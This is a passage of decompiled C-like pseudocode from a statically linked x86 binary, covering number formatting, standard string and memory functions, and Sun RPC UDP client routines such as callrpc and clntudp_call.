  long double v20; // fst4@21
  long double v21; // fst5@21
  long double v22; // t0@21
  long double v23; // fst4@21
  long double v24; // fst6@21
  long double v25; // fst2@22
  long double v26; // t2@23
  long double v27; // fst4@23
  long double v28; // tt@23
  long double v29; // t0@24
  long double v30; // fst4@24
  long double v31; // t1@24
  long double v32; // t2@26
  long double v33; // fst4@26
  long double v34; // tt@26
  signed int v35; // edi@29
  signed int v36; // esi@30
  unsigned int v37; // ebx@30
  unsigned int v38; // edx@31
  int v39; // eax@31
  int v40; // ebx@39
  char *v41; // ecx@43
  char v42; // al@43
  int v43; // esi@48
  char *v44; // edx@48
  signed int v45; // ebx@56
  int v46; // edi@59
  int v47; // edx@59
  int v48; // ebx@74
  int v49; // edx@84
  char v50; // di@84
  char *v51; // ebx@86
  signed int v52; // esi@86
  __int64 v53; // rax@87
  int v54; // eax@87
  signed __int64 v55; // rt2@87
  int *v56; // eax@90
  int v57; // edx@91
  int v58; // eax@92
  unsigned int v59; // esi@92
  int v60; // edi@97
  int *v61; // ebx@100
  int v62; // eax@101
  int v64; // [esp-4h] [ebp-F8h]@101
  __int64 v65; // [esp+0h] [ebp-F4h]@30
  char *v66; // [esp+14h] [ebp-E0h]@31
  int v67; // [esp+18h] [ebp-DCh]@10
  int v68; // [esp+1Ch] [ebp-D8h]@1
  char *v69; // [esp+20h] [ebp-D4h]@29
  unsigned __int8 v70; // [esp+26h] [ebp-CEh]@1
  char v71; // [esp+27h] [ebp-CDh]@83
  char *v72; // [esp+28h] [ebp-CCh]@50
  unsigned __int8 v73; // [esp+2Fh] [ebp-C5h]@53
  __int64 v74; // [esp+30h] [ebp-C4h]@30
  __int16 v75; // [esp+3Ch] [ebp-B8h]@29
  __int16 v76; // [esp+3Eh] [ebp-B6h]@29
  int v77; // [esp+4Ch] [ebp-A8h]@92
  int v78; // [esp+50h] [ebp-A4h]@92
  char *v79; // [esp+54h] [ebp-A0h]@92
  int v80; // [esp+58h] [ebp-9Ch]@15
  int v81; // [esp+5Ch] [ebp-98h]@15
  char *v82; // [esp+60h] [ebp-94h]@9
  int v83; // [esp+64h] [ebp-90h]@17
  int v84; // [esp+68h] [ebp-8Ch]@61
  int v85; // [esp+6Ch] [ebp-88h]@60
  int v86; // [esp+70h] [ebp-84h]@62
  int v87; // [esp+74h] [ebp-80h]@63
  void *v88; // [esp+78h] [ebp-7Ch]@63
  char v89; // [esp+7Ch] [ebp-78h]@63
  char v90; // [esp+ACh] [ebp-48h]@41
  char v91; // [esp+ADh] [ebp-47h]@42
  char v92; // [esp+AEh] [ebp-46h]@29
  char v93; // [esp+C3h] [ebp-31h]@43
  char v94; // [esp+CAh] [ebp-2Ah]@1
  char v95; // [esp+D9h] [ebp-1Bh]@86
  char v96; // [esp+DAh] [ebp-1Ah]@5
  char v97; // [esp+DBh] [ebp-19h]@9
  char v98; // [esp+DEh] [ebp-16h]@59
  char v99; // [esp+DFh] [ebp-15h]@59

  v68 = *(_DWORD *)(a3 + 4);
  v4 = *(_BYTE *)(a3 + 8);
  v5 = *(_DWORD *)a3;
  v70 = *(_BYTE *)(a3 + 8);
  v94 = 101;
  if ( (v70 | 0x20) == 97 )
    v70 = v4 + 6;
  if ( v5 < 0 )
    v5 = 6;
  v96 = 0;
  v6 = *(_DWORD *)(a3 + 12);
  if ( v6 & 2 )
  {
    v96 = 43;
  }
  else if ( v6 & 1 )
  {
    v96 = 32;
  }
  v97 = 0;
  v82 = 0;
  if ( a2 == 0.0 )
  {
    v7 = 1.0 / a2;
    v67 = -1;
    v8 = 0.0 < v7;
    v9 = 0.0 == v7;
    v10 = a2;
    if ( v8 == 0 && v9 == 0 )
      v96 = 45;
    goto LABEL_29;
  }
  v11 = a2;
  if ( a2 < 0.0 )
  {
    v96 = 45;
    v11 = -a2;
  }
  v12 = v11;
  if ( v11 == 0.25 * v11 )
  {
    *(_DWORD *)(a3 + 16) = 32;
    v80 = 112;
    v81 = 3;
    if ( (char)v70 <= 96 )
      v82 += 4;
    v82 += 134593424;
    v13 = &v83;
    goto LABEL_90;
  }
  v14 = 100000000.0;
  v67 = 8;
  v15 = 13;
  v16 = 4096;
  v17 = 1000000000.0;
  while ( 1 )
  {
    --v15;
    if ( v14 <= v11 )
    {
      v25 = v12 / exp10_table[v15];
      if ( v25 >= v14 )
      {
        v26 = v17;
        v27 = v14;
        v21 = v26;
        v28 = v27;
        v23 = v25;
        v24 = v28;
        v67 += v16;
        goto LABEL_25;
      }
    }
    else
    {
      v18 = exp10_table[v15] * v12;
      if ( v17 > v18 )
      {
        v19 = v17;
        v20 = v14;
        v21 = v19;
        v22 = v20;
        v23 = v18;
        v24 = v22;
        v67 -= v16;
        goto LABEL_25;
      }
    }
    v29 = v17;
    v30 = v14;
    v21 = v29;
    v31 = v30;
    v23 = v12;
    v24 = v31;
LABEL_25:
    if ( !v15 )
      break;
    v32 = v23;
    v33 = v24;
    v12 = v32;
    v34 = v33;
    v17 = v21;
    v14 = v34;
    v16 >>= 1;
  }
  v10 = v23;
  if ( v23 >= 1000000000.0 )
  {
    v10 = v23 / 10.0;
    ++v67;
  }
LABEL_29:
  v69 = &v92;
  v35 = 0;
  v75 = v76 | 0xC00;
  do
  {
    v74 = (signed __int64)v10;
    v36 = 0;
    v65 = (unsigned int)(signed __int64)v10;
    v37 = (signed __int64)v10;
    v69 += 9;
    v10 = (v10 - (long double)v65) * 1000000000.0;
    do
    {
      v66 = &v69[-++v36];
      v38 = v37 % 0xA;
      v37 /= 0xAu;
      v39 = (int)&v69[-v36];
      v69[-v36] = v38 + 48;
    }
    while ( v36 <= 8 );
    ++v35;
  }
  while ( v35 <= 2 );
  if ( (char)v70 <= 96 )
  {
    v70 += 32;
    v94 = 69;
  }
  if ( v70 == 103 )
  {
    if ( v5 > 0 )
      --v5;
LABEL_39:
    v40 = v5;
  }
  else
  {
    if ( v70 != 102 )
      goto LABEL_39;
    v40 = v5 + v67;
    if ( v5 + v67 < -1 )
    {
      HIDWORD(v65) = v39;
      v40 = -1;
      memset(&v90, 48, 0x15u);
      v67 = -1;
    }
  }
  v90 = 0;
  v91 = 48;
  if ( v40 <= 20 )
  {
    v41 = &v91 + v40 + 2;
    v42 = *v41 >= 53;
  }
  else
  {
    v41 = &v93;
    v42 = 0;
  }
  do
  {
    do
      *--v41 += v42;
    while ( *v41 == 48 );
  }
  while ( *v41 > 57 );
  if ( v41 <= &v91 )
  {
    v44 = &v91;
    v43 = v67 + 1;
    v41 = &v91;
  }
  else
  {
    v43 = v67;
    v44 = &v92;
  }
  v72 = v41 + 1;
  v41[1] = 0;
  if ( v70 == 103 )
  {
    if ( v43 < -4 || v43 > v40 )
    {
      v73 = 103;
      goto LABEL_56;
    }
    v73 = 102;
    v5 = v40 - v43;
LABEL_57:
    v45 = v43;
    if ( v43 < 0 )
      *--v44 = 48;
  }
  else
  {
    v73 = v70;
    if ( v70 == 102 )
      goto LABEL_57;
LABEL_56:
    v45 = 0;
  }
  v80 = 176;
  v81 = 1;
  v82 = &v98;
  v46 = (int)(v44 + 1);
  v98 = *v44;
  v47 = v72 - (v44 + 1);
  v99 = 0;
  if ( v45 < 0 )
  {
LABEL_67:
    v13 = &v83;
    goto LABEL_69;
  }
  v83 = 112;
  v85 = v46;
  if ( v45 < v47 )
  {
    if ( v45 > 0 )
    {
      v84 = v45;
      v46 += v45;
      v47 -= v45;
      v13 = &v86;
      v45 = -1;
      goto LABEL_69;
    }
    v45 = -1;
    goto LABEL_67;
  }
  v84 = v47;
  if ( v45 - v47 > 0 )
  {
    v86 = 176;
    v87 = v45 - v47;
    v88 = &unk_805BB93;
    v45 = -1;
    v13 = (int *)&v89;
  }
  else
  {
    v45 = -1;
    v13 = &v86;
  }
  v47 = 0;
LABEL_69:
  if ( *(_BYTE *)(a3 + 12) & 0x10 || v47 || v70 != 103 && v5 > 0 )
  {
    *v13 = 112;
    v13[1] = 1;
    v13[2] = (int)L".,";
    v13 += 3;
  }
  v48 = v45 + 1;
  if ( v48 )
  {
    *v13 = 176;
    v13[1] = -v48;
    v13[2] = (int)&unk_805BB93;
    v13 += 3;
  }
  if ( v47 )
  {
    *v13 = 112;
    v13[1] = v47;
    v13[2] = v46;
    v13 += 3;
  }
  if ( (v70 != 103 || *(_BYTE *)(a3 + 12) & 0x10) && v47 - v48 < v5 )
  {
    *v13 = 176;
    v13[1] = v5 - (v47 - v48);
    v13[2] = (int)&unk_805BB93;
    v13 += 3;
  }
  if ( v73 != 102 )
  {
    v71 = v94;
    if ( v43 < 0 )
    {
      v50 = 45;
      v49 = -v43;
    }
    else
    {
      v49 = v43;
      v50 = 43;
    }
    v95 = 0;
    v51 = &v95;
    v52 = 2;
    do
    {
      do
      {
        v53 = v49;
        v55 = v53 % 10;
        v54 = v53 / 10;
        --v51;
        ++v52;
        *v51 = v55 + 48;
        v49 = v54;
      }
      while ( v52 <= 3 );
    }
    while ( v54 );
    *(v51 - 1) = v50;
    *(v51 - 2) = v71;
    *v13 = 112;
    v13[1] = v52;
    v13[2] = (int)(v51 - 2);
    v13 += 3;
  }
LABEL_90:
  v56 = &v81;
  do
  {
    v57 = *v56;
    v56 += 3;
    v68 -= v57;
  }
  while ( v56 < v13 );
  v79 = &v96;
  v78 = v96 != 0;
  v77 = 160;
  v58 = v68 - v78;
  v59 = (unsigned int)v13;
  if ( v68 - v78 > 0 )
  {
    if ( *(_BYTE *)(a3 + 12) & 8 )
    {
      v59 = (unsigned int)(v13 + 3);
      *v13 = 160;
      v13[1] = v58;
      v13[2] = (int)&unk_805BB93;
    }
    else
    {
      if ( *(_DWORD *)(a3 + 16) == 48 )
        v81 += v58;
      else
        v78 = v68;
      v59 = (unsigned int)v13;
    }
  }
  v60 = 0;
  v61 = &v77;
  while ( 1 )
  {
    v65 = *(_QWORD *)(v61 + 1);
    v64 = *v61;
    v62 = ((int (__cdecl *)(int, int, _DWORD, _DWORD))a4)(a1, v64, v65, HIDWORD(v65));
    if ( v62 != v61[1] )
      break;
    v61 += 3;
    v60 += v62;
    if ( (unsigned int)v61 >= v59 )
      return v60;
  }
  return -1;
}
// 805BBA0: using guessed type wchar_t a_[3];

//----- (08054ED4) --------------------------------------------------------
signed int __cdecl getc_unlocked(unsigned int *a1)
{
  unsigned __int8 *v1; // eax@1
  unsigned int v2; // ecx@4
  __int16 v3; // dx@4
  int v4; // edx@5
  unsigned int v5; // eax@11
  unsigned __int8 addr; // [esp+17h] [ebp-5h]@15

  v1 = (unsigned __int8 *)a1[4];
  if ( (unsigned int)v1 < a1[6] )
    goto LABEL_14;
  if ( (*(_WORD *)a1 & 0x83u) <= 0x80 && _stdio_trans2r_o(a1, 128) )
    return -1;
  v2 = *a1;
  v3 = *a1;
  if ( !(*a1 & 2) )
  {
    v1 = (unsigned __int8 *)a1[4];
    if ( (unsigned __int8 *)a1[5] == v1 )
    {
      if ( a1[1] == -2 )
      {
        *(_WORD *)a1 = v2 | 4;
        return -1;
      }
      if ( HIBYTE(v3) & 3 )
        fflush_unlocked((int)&stdio_openlist);
      v5 = a1[2];
      if ( a1[3] == v5 )
      {
        if ( _stdio_READ((int)a1, &addr, 1u) )
          return addr;
        return -1;
      }
      a1[6] = v5;
      if ( !_stdio_rfill((int)a1) )
        return -1;
      a1[6] = a1[5];
      v1 = (unsigned __int8 *)a1[4];
    }
LABEL_14:
    v4 = *v1;
    a1[4] = (unsigned int)(v1 + 1);
    return v4;
  }
  *(_WORD *)a1 = v2 - 1;
  LOBYTE(v4) = a1[(v3 & 1) + 9];
  a1[10] = 0;
  return (unsigned __int8)v4;
}
// 806199C: using guessed type int *stdio_openlist;

//----- (08054FB0) --------------------------------------------------------
int __cdecl memchr(_BYTE *a1, char a2, int a3)
{
  int v3; // edx@1
  int v4; // ecx@1
  _BYTE *v5; // edi@1
  bool v6; // zf@1

  v3 = 0;
  v4 = a3;
  v5 = a1;
  v6 = a3 == 0;
  if ( a3 )
  {
    do
    {
      if ( !v4 )
        break;
      v6 = *v5++ == a2;
      --v4;
    }
    while ( !v6 );
    if ( !v6 )
      v5 = (_BYTE *)1;
    v3 = (int)(v5 - 1);
  }
  return v3;
}

//----- (08054FD4) --------------------------------------------------------
char *__cdecl memmove(char *a1, char *a2, unsigned int a3)
{
  char *result; // eax@1
  unsigned int v4; // ecx@1
  char *v5; // esi@3
  char *v6; // edi@3

  result = a1;
  v4 = a3;
  if ( a1 >= a2 )
  {
    v5 = &a2[a3 - 1];
    v6 = &a1[a3 - 1];
    while ( v4 )
    {
      *v6-- = *v5--;
      --v4;
    }
  }
  else
  {
    qmemcpy(a1, a2, a3);
  }
  return result;
}

//----- (08054FFC) --------------------------------------------------------
int __cdecl mempcpy(char *a1, char *a2, unsigned int a3)
{
  memcpy(a1, a2, a3);
  return (int)&a1[a3];
}

//----- (08055020) --------------------------------------------------------
int __cdecl memrchr(int a1, unsigned __int8 a2, unsigned int a3)
{
  unsigned int v3; // ebx@1
  int result; // eax@1
  _BYTE *v5; // ecx@6
  int v6; // esi@7

  v3 = a3;
  result = a3 + a1;
  while ( v3 && result & 3 )
  {
    if ( *(_BYTE *)--result == a2 )
      return result;
    --v3;
  }
  v5 = (_BYTE *)result;
  while ( v3 > 3 )
  {
    v5 -= 4;
    v6 = a2 | (a2 << 8) | ((a2 | (a2 << 8)) << 16);
    if ( (~(*(_DWORD *)v5 ^ v6) ^ ((*(_DWORD *)v5 ^ v6) + 2130640639)) & 0x81010100 )
    {
      result = (int)(v5 + 3);
      if ( v5[3] == a2 )
        return result;
      result = (int)(v5 + 2);
      if ( v5[2] == a2 )
        return result;
      result = (int)(v5 + 1);
      if ( v5[1] == a2 )
        return result;
      if ( *v5 == a2 )
        return (int)v5;
    }
    v3 -= 4;
  }
  result = (int)v5;
  while ( --v3 != -1 )
  {
    if ( *(_BYTE *)--result == a2 )
      return result;
  }
  return 0;
}

//----- (080550D0) --------------------------------------------------------
char *__cdecl strtok_r(char *a1, _BYTE *a2, char **a3)
{
  char *v3; // ebx@1
  char *v4; // ebx@3
  char *result; // eax@4
  _BYTE *v6; // eax@5
  int v7; // eax@6

  v3 = a1;
  if ( !a1 )
    v3 = *a3;
  v4 = &v3[strspn(v3, a2)];
  if ( *v4 )
  {
    v6 = strpbrk(v4, a2);
    if ( v6 )
    {
      *v6 = 0;
      v7 = (int)(v6 + 1);
    }
    else
    {
      v7 = rawmemchr((int)v4, 0);
    }
    *a3 = (char *)v7;
    result = v4;
  }
  else
  {
    result = 0;
    *a3 = v4;
  }
  return result;
}

//----- (0805512C) --------------------------------------------------------
_BYTE *__cdecl strpbrk(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax@1
  _BYTE *i; // edx@3

  for ( result = a1; *result; ++result )
  {
    for ( i = a2; *i; ++i )
    {
      if ( *i == *result )
        return result;
    }
  }
  return 0;
}

//----- (08055154) --------------------------------------------------------
__int64 __usercall _rpc_thread_clnt_cleanup@<edx:eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // ebx@1
  __int64 v4; // [esp+0h] [ebp-Ch]@0

  v2 = (_DWORD *)_rpc_thread_variables(a1, a2)[41];
  if ( v2 )
  {
    if ( *v2 )
      (*(void (__cdecl **)(_DWORD))(*(_DWORD *)(*v2 + 4) + 16))(*v2);
    free(a1, v2);
  }
  return v4;
}

//----- (0805518A) --------------------------------------------------------
int __usercall callrpc@<eax>(int a1@<edi>, unsigned __int8 *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  _DWORD *v9; // eax@1
  _DWORD *v10; // ebx@1
  int *v11; // esi@1
  int result; // eax@2
  _BYTE *v13; // eax@5
  int v14; // eax@10
  unsigned int v15; // ebx@14
  int i; // edx@14
  void *v17; // esp@17
  char **v18; // eax@20
  char v19; // [esp-401h] [ebp-459h]@14
  _DWORD *v20; // [esp-8h] [ebp-60h]@2
  _DWORD *v21; // [esp-4h] [ebp-5Ch]@2
  int v22; // [esp+8h] [ebp-50h]@1
  int v23; // [esp+Ch] [ebp-4Ch]@1
  int v24; // [esp+10h] [ebp-48h]@1
  int v25; // [esp+14h] [ebp-44h]@1
  char v26; // [esp+1Ch] [ebp-3Ch]@18
  __int16 v27; // [esp+30h] [ebp-28h]@20
  __int16 v28; // [esp+32h] [ebp-26h]@20
  char v29; // [esp+34h] [ebp-24h]@20
  int v30; // [esp+40h] [ebp-18h]@15
  int v31; // [esp+44h] [ebp-14h]@18
  int savedregs; // [esp+58h] [ebp+0h]@1

  v24 = 0;
  v25 = 0;
  v22 = 0;
  v23 = 0;
  v9 = _rpc_thread_variables((off_t)&savedregs, a1);
  v10 = v9;
  v11 = (int *)v9[41];
  if ( !v11 )
  {
    v21 = v9;
    v20 = v9;
    v11 = calloc((off_t)&savedregs, a3, 1u, 24);
    result = 0;
    if ( !v11 )
      return result;
    v10[41] = v11;
  }
  if ( !v11[5] )
  {
    v13 = (_BYTE *)malloc((off_t)&savedregs, a3, 0x100u);
    v11[5] = (int)v13;
    *v13 = 0;
    v11[1] = -1;
  }
  if ( !v11[4]
    || v11[2] != a3
    || v11[3] != a4
    || (v21 = (_DWORD *)a4, v20 = (_DWORD *)a4, strcoll((unsigned __int8 *)v11[5], a2)) )
  {
    v14 = v11[1];
    v11[4] = 0;
    if ( v14 != -1 )
    {
      _libc_close(v14);
      v11[1] = -1;
    }
    if ( *v11 )
    {
      (*(void (__cdecl **)(int))(*(_DWORD *)(*v11 + 4) + 16))(*v11);
      *v11 = 0;
    }
    v15 = 1024;
    for ( i = (unsigned int)&v19 & 0xFFFFFFF0;
          gethostbyname_r(a2, &v26, i, v15, &v31, &v30) || !v31;
          i = (unsigned int)&v19 & 0xFFFFFFF0 )
    {
      if ( v30 != -1 || *(_DWORD *)_errno_location() != 34 )
        return 13;
      v15 *= 2;
      v17 = alloca(v15 + 15);
    }
    v25 = 0;
    v24 = 5;
    memcpy(&v29, **(char ***)(v31 + 16), *(_DWORD *)(v31 + 12));
    v27 = 2;
    v28 = 0;
    v18 = clntudp_create((off_t)&savedregs, a3, (int)&v27, a3, a4, v24, v25, v11 + 1);
    *v11 = (int)v18;
    if ( !v18 )
      return *(_DWORD *)_rpc_thread_createerr((off_t)&savedregs, a3);
    v11[4] = 1;
    v11[2] = a3;
    v11[3] = a4;
    strncpy((_BYTE *)v11[5], (char *)a2, 255);
    *(_BYTE *)(v11[5] + 255) = 0;
  }
  v22 = 25;
  v23 = 0;
  result = (**(int (__cdecl ***)(int, int, int, int, int, int, signed int, _DWORD))(*v11 + 4))(
             *v11,
             a5,
             a6,
             a7,
             a8,
             a9,
             25,
             0);
  if ( result )
    v11[4] = 0;
  return result;
}

//----- (0805539C) --------------------------------------------------------
char *__cdecl clntudp_geterr(int a1, char *a2)
{
  return memcpy(a2, (char *)(*(_DWORD *)(a1 + 8) + 44), 0xCu);
}

//----- (080553B9) --------------------------------------------------------
int __cdecl clntudp_freeres(int a1, int (__cdecl *a2)(_DWORD *, int), int a3)
{
  _DWORD *v3; // eax@1

  v3 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 56);
  *v3 = 2;
  return a2(v3, a3);
}

//----- (080553DC) --------------------------------------------------------
signed int __cdecl clntudp_control(int a1, int a2, char *a3)
{
  int v3; // ecx@1
  signed int result; // eax@2
  unsigned int v5; // edx@5
  int v6; // edx@6
  int v7; // eax@6
  unsigned int v8; // edx@7
  unsigned __int32 v9; // eax@11

  v3 = *(_DWORD *)(a1 + 8);
  switch ( a2 )
  {
    case 1:
      v5 = *(_DWORD *)a3;
      *(_DWORD *)(v3 + 40) = *((_DWORD *)a3 + 1);
      *(_DWORD *)(v3 + 36) = v5;
      goto LABEL_19;
    case 2:
      v6 = *(_DWORD *)(v3 + 36);
      v7 = *(_DWORD *)(v3 + 40);
      goto LABEL_9;
    case 3:
      memcpy(a3, (char *)(v3 + 8), 0x10u);
      return 1;
    case 4:
      v8 = *(_DWORD *)a3;
      *(_DWORD *)(v3 + 32) = *((_DWORD *)a3 + 1);
      *(_DWORD *)(v3 + 28) = v8;
      goto LABEL_19;
    case 5:
      v6 = *(_DWORD *)(v3 + 28);
      v7 = *(_DWORD *)(v3 + 32);
LABEL_9:
      *((_DWORD *)a3 + 1) = v7;
      *(_DWORD *)a3 = v6;
      goto LABEL_19;
    case 6:
      v9 = *(_DWORD *)v3;
      goto LABEL_17;
    case 8:
      *(_DWORD *)(v3 + 4) = 1;
      goto LABEL_19;
    case 9:
      *(_DWORD *)(v3 + 4) = 0;
      goto LABEL_19;
    case 10:
      v9 = _byteswap_ulong(**(_DWORD **)(v3 + 88));
      goto LABEL_17;
    case 11:
      **(_DWORD **)(v3 + 88) = _byteswap_ulong(*(_DWORD *)a3 - 1);
      goto LABEL_14;
    case 12:
LABEL_14:
      v9 = _byteswap_ulong(*(_DWORD *)(*(_DWORD *)(v3 + 88) + 16));
      goto LABEL_17;
    case 13:
      *(_DWORD *)(*(_DWORD *)(v3 + 88) + 16) = _byteswap_ulong(*(_DWORD *)a3);
      goto LABEL_19;
    case 14:
      v9 = _byteswap_ulong(*(_DWORD *)(*(_DWORD *)(v3 + 88) + 12));
LABEL_17:
      *(_DWORD *)a3 = v9;
      goto LABEL_19;
    case 15:
      *(_DWORD *)(*(_DWORD *)(v3 + 88) + 12) = _byteswap_ulong(*(_DWORD *)a3);
LABEL_19:
      result = 1;
      break;
    default:
      result = 0;
      break;
  }
  return result;
}

//----- (080554AD) --------------------------------------------------------
char **__usercall clntudp_bufcreate@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5, int a6, int a7, int *a8, int a9, int a10)
{
  int v10; // eax@1
  int v11; // edi@1
  unsigned int v12; // ebx@1
  char **v13; // ebp@1
  int v14; // eax@1
  int v15; // esi@1
  _DWORD *v16; // ebx@3
  __int16 v17; // ax@5
  __int16 v18; // ax@6
  int v19; // eax@9
  _DWORD *v20; // ebx@10
  char **v21; // ST10_4@17
  int v23; // [esp+24h] [ebp-48h]@7
  int v24; // [esp+28h] [ebp-44h]@7
  int v25; // [esp+2Ch] [ebp-40h]@7
  int v26; // [esp+30h] [ebp-3Ch]@7
  int v27; // [esp+34h] [ebp-38h]@7
  int v28; // [esp+54h] [ebp-18h]@11
  int v29; // [esp+58h] [ebp-14h]@9

  v10 = malloc(a1, a2, 0xCu);
  v11 = (a9 + 3) & 0xFFFFFFFC;
  v12 = (a10 + 3) & 0xFFFFFFFC;
  v13 = (char **)v10;
  v14 = malloc(v10, v11, v11 + v12 + 100);
  v15 = v14;
  if ( v13 && v14 )
  {
    *(_DWORD *)(v14 + 88) = v14 + v12 + 96;
    if ( !*(_WORD *)(a3 + 2) )
    {
      v17 = pmap_getport((off_t)v13, a3, a4, a5, 17);
      if ( !v17 )
        goto LABEL_14;
      v18 = __ROR2__(v17, 8);
      *(_WORD *)(a3 + 2) = v18;
    }
    v13[1] = (char *)&udp_ops;
    v13[2] = (char *)v15;
    memcpy((char *)(v15 + 8), (char *)a3, 0x10u);
    *(_DWORD *)(v15 + 28) = a6;
    *(_DWORD *)(v15 + 92) = v12;
    *(_DWORD *)(v15 + 24) = 16;
    *(_DWORD *)(v15 + 32) = a7;
    *(_DWORD *)(v15 + 36) = -1;
    *(_DWORD *)(v15 + 40) = -1;
    *(_DWORD *)(v15 + 84) = v11;
    v23 = create_xid((off_t)v13);
    v27 = a5;
    v26 = a4;
    v24 = 0;
    v25 = 2;
    xdrmem_create((_DWORD *)(v15 + 56), *(_DWORD *)(v15 + 88), v11, 0);
    if ( xdr_callhdr((int)&v23, (_DWORD *)(v15 + 56), (int)&v23) )
    {
      *(_DWORD *)(v15 + 80) = (*(int (__cdecl **)(int))(*(_DWORD *)(v15 + 60) + 16))(v15 + 56);
      if ( *a8 >= 0 )
      {
        *(_DWORD *)(v15 + 4) = 0;
      }
      else
      {
        v29 = 1;
        v19 = socket(2, 2, 17);
        *a8 = v19;
        if ( v19 < 0 )
        {
          v20 = _rpc_thread_createerr((off_t)v13, v11);
          *v20 = 12;
          v20[2] = *(_DWORD *)_errno_location();
          goto LABEL_14;
        }
        bindresvport(v19, 0);
        ioctl(*a8, 21537);
        v28 = 1;
        setsockopt(*a8, 0, 11, (int)&v28, 4);
        *(_DWORD *)(v15 + 4) = 1;
      }
      *(_DWORD *)v15 = *a8;
      *v13 = authnone_create((off_t)v13, v11);
      return v13;
    }
  }
  else
  {
    v16 = _rpc_thread_createerr((off_t)v13, v11);
    fputs((off_t)v13, "clntudp_create: out of memory\n", stderr);
    *v16 = 12;
    v16[2] = 12;
  }
LABEL_14:
  if ( v15 )
    free((unsigned int)v13, (_DWORD *)v15);
  if ( v13 )
  {
    v21 = v13;
    v13 = 0;
    free(0, v21);
  }
  return v13;
}
// 8061BEC: using guessed type int (__cdecl *udp_ops)(int, char, int, int, int, int, int, int);

//----- (080556E5) --------------------------------------------------------
char **__usercall clntudp_create@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5, int a6, int a7, int *a8)
{
  return clntudp_bufcreate(a1, a2, a3, a4, a5, a6, a7, a8, 8800, 8800);
}

//----- (08055713) --------------------------------------------------------
void __usercall clntudp_destroy(unsigned int a1@<ebp>, _DWORD *a2)
{
  int *v2; // ebx@1
  void (__cdecl *v3)(int *); // edx@3

  v2 = (int *)a2[2];
  if ( v2[1] )
    _libc_close(*v2);
  v3 = *(void (__cdecl **)(int *))(v2[15] + 28);
  if ( v3 )
    v3(v2 + 14);
  free(a1, v2);
  free(a1, a2);
}

//----- (0805575F) --------------------------------------------------------
signed int __usercall clntudp_call@<eax>(char *a1@<edi>, _DWORD *a2, char a3, int (__cdecl *a4)(_DWORD *, int, int, int), int a5, int a6, int a7, int a8, int a9)
{
  int v9; // esi@1
  int v10; // eax@3
  signed int result; // eax@3
  int v12; // eax@4
  int v13; // edx@8
  int v14; // eax@9
  unsigned int v15; // eax@17
  signed int v16; // edi@20
  bool v17; // zf@34
  void *v18; // esp@36
  signed int v19; // eax@36
  signed int v20; // ebx@36
  _DWORD *v21; // eax@46
  int v22; // eax@52
  int v23; // ST14_4@61
  _DWORD *v24; // [esp+4h] [ebp-2344h]@7
  int v25; // [esp+8h] [ebp-2340h]@6
  int timeout; // [esp+Ch] [ebp-233Ch]@1
  int v27; // [esp+10h] [ebp-2338h]@6
  int *v28; // [esp+14h] [ebp-2334h]@20
  int d; // [esp+18h] [ebp-2330h]@19
  int v30; // [esp+1Ch] [ebp-232Ch]@6
  int v31; // [esp+20h] [ebp-2328h]@6
  int v32; // [esp+24h] [ebp-2324h]@2
  int v33; // [esp+28h] [ebp-2320h]@2
  __int16 *v34; // [esp+38h] [ebp-2310h]@19
  int v35; // [esp+3Ch] [ebp-230Ch]@36
  unsigned int *v36; // [esp+40h] [ebp-2308h]@36
  int v37; // [esp+44h] [ebp-2304h]@36
  unsigned int v38; // [esp+48h] [ebp-2300h]@36
  unsigned int v39; // [esp+4Ch] [ebp-22FCh]@36
  int v40; // [esp+50h] [ebp-22F8h]@36
  char v41; // [esp+2298h] [ebp-B0h]@61
  char v42; // [esp+22A4h] [ebp-A4h]@16
  int v43; // [esp+22A8h] [ebp-A0h]@65
  int v44; // [esp+22B4h] [ebp-94h]@16
  int v45; // [esp+22B8h] [ebp-90h]@16
  int v46; // [esp+22C8h] [ebp-80h]@21
  char v47; // [esp+22D8h] [ebp-70h]@22
  char v48; // [esp+22E8h] [ebp-60h]@61
  __int16 v49; // [esp+2300h] [ebp-48h]@36
  __int16 v50; // [esp+2302h] [ebp-46h]@45
  char v51; // [esp+2304h] [ebp-44h]@44
  char v52; // [esp+2310h] [ebp-38h]@52
  int v53; // [esp+2320h] [ebp-28h]@19
  int *v54; // [esp+2324h] [ebp-24h]@19
  unsigned int v55; // [esp+2328h] [ebp-20h]@36
  int v56; // [esp+232Ch] [ebp-1Ch]@36
  int v57; // [esp+2330h] [ebp-18h]@16
  __int16 v58; // [esp+2334h] [ebp-14h]@16
  char v59; // [esp+2336h] [ebp-12h]@35
  int v60; // [esp+2338h] [ebp-10h]@52

  v9 = a2[2];
  timeout = *(_DWORD *)(v9 + 32) / 1000 + 1000 * *(_DWORD *)(v9 + 28);
  if ( *(_DWORD *)(v9 + 40) == -1 )
  {
    v32 = a9;
    v33 = a8;
  }
  else
  {
    v32 = *(_DWORD *)(v9 + 40);
    v33 = *(_DWORD *)(v9 + 36);
  }
  v25 = 0;
  v27 = 2;
  v30 = 0;
  v31 = 0;
  while ( 1 )
  {
    v24 = (_DWORD *)(v9 + 56);
    if ( a4 )
    {
      *(_DWORD *)(v9 + 56) = 0;
      (*(void (__cdecl **)(int, _DWORD, char *, char *))(*(_DWORD *)(v9 + 60) + 20))(
        v9 + 56,
        *(_DWORD *)(v9 + 80),
        a1,
        a1);
      ++**(_DWORD **)(v9 + 88);
      if ( !(*(int (__cdecl **)(int, char *))(*(_DWORD *)(v9 + 60) + 4))(v9 + 56, &a3)
        || (v14 = (*(int (__cdecl **)(_DWORD, _DWORD *, int, int))(*(_DWORD *)(*a2 + 32) + 4))(*a2, v24, v13, v13)) == 0
        || !a4(v24, a5, v14, v14) )
      {
        result = 1;
        *(_DWORD *)(v9 + 44) = 1;
        return result;
      }
      v25 = (*(int (__cdecl **)(int))(*(_DWORD *)(v9 + 60) + 16))(v9 + 56);
LABEL_13:
      if ( _libc_sendto(*(_DWORD *)v9, *(_DWORD *)(v9 + 88), v25, 0, v9 + 8, *(_DWORD *)(v9 + 24)) != v25 )
      {
        v10 = *(_DWORD *)_errno_location();
        *(_DWORD *)(v9 + 44) = 3;
        *(_DWORD *)(v9 + 48) = v10;
        return 3;
      }
      if ( !v33 && !v32 )
      {
LABEL_33:
        result = 5;
        *(_DWORD *)(v9 + 44) = 5;
        return result;
      }
    }
